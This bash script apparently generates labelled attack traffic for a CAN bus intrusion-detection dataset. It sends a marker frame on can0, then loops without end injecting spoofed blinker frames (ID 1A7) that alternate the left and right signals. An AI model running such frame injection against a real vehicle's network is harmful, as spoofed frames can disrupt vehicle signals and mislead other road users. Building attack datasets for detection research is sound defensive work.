#!/bin/bash

# Automated multiple attacks with marker frames for attack labeling dataset generation
trap "cansend can0 010#01; echo 'Marker frame sent'; exit" SIGINT

count=0
while true; do
    # Send marker frame to indicate attack for data labeling
    while [[ $count -lt 1 ]]; do
        cansend can0 010#01
        sleep 0.1
        count=$((count + 1))
    done
    # Blinkers
    cansend can0 1A7#00014A5789747292 # Left blinker, first byte 01
    sleep 0.1
    cansend can0 1A7#01004A5789747392 # Right blinker, second byte 01
    sleep 0.1
done
